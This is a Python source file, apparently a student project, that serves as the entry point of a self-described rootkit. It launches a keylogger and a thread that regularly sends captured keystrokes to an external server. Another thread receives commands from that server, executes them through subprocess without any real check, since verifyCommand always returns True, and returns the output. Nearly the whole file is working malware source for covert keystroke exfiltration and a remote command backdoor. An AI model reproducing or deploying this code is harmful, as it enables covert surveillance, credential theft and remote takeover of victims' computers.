# /usr/bin/python3

import keylogger.model as kl
import network.network as net
import subprocess
import threading
import time

"""
The entry point to the rootkit will setup a series of covert channels for
collecting information from the user.  The first is a keylogger that will
begin to capture keys that are being hit, as well as a socket to receive
 data from an external computer.

This external computer will receive packets containing information captured
by the keylogger. The external computer can then send information to the
rootkit to execute particular commands and send the results back to the
calling computer.
"""

__author__ = "Nathaniel Cotton"
__email__ = "nec2887@rit.edu"


class KeyChecker(threading.Thread):
    """
    This thread will monitor the keylogger and if
    it has keys that it has captured it will take
    those keys and send them off to the server.
    """
    __slots__ = ['keylogger']

    def __init__(self, keylogger):
        super().__init__()
        self.keylogger = keylogger

    def run(self):
        """
        Will continually poll the the keylogger for whether
        or not it has information to send.  If it does
        have information it will get the information
        and send it off to the server.
        :return:
        """
        while True:
            if self.keylogger.hasInfoToSend():
                info = self.keylogger.getInfo()
                net.send(info)
            time.sleep(5)


class RecvChecker(threading.Thread):
    """
    This thread is designed to received messages sent from
    the server and execute the received message and send the
    results back to the requesting server.
    """

    def __init__(self):
        """
        Simple constructor
        """
        super().__init__()

    def run(self):
        """
        Constantly checks if there is received message
        and if it is a valid command it will be executed
        and the results will be piped back to the requesting
        server.
        :return:
        """
        while True:
            command = net.recv()
            if (self.verifyCommand(command)):
                try:
                    sp = subprocess.getoutput(command)
                    net.send(sp)
                except Exception as e:
                    pass

    def verifyCommand(self, command):
        return True


def instanceAlreadyRunning():
    """
    Detects if a python3 program is already running
    :return:
    """
    result = subprocess.getoutput(['ps | grep python3'])
    return '\n' in result

def main():
    """
    Entry point into the application, that will setup the keylogger
    and the networking functionality.
    :return:
    """
    if not instanceAlreadyRunning():
        keylogger = kl.getKeyLogger()
        keylogger.start()
        keychecker = KeyChecker(keylogger)
        keychecker.start()
        recvChecker = RecvChecker()
        recvChecker.start()
        
    else:
        print('Already Running')

if __name__ == '__main__':
    main()
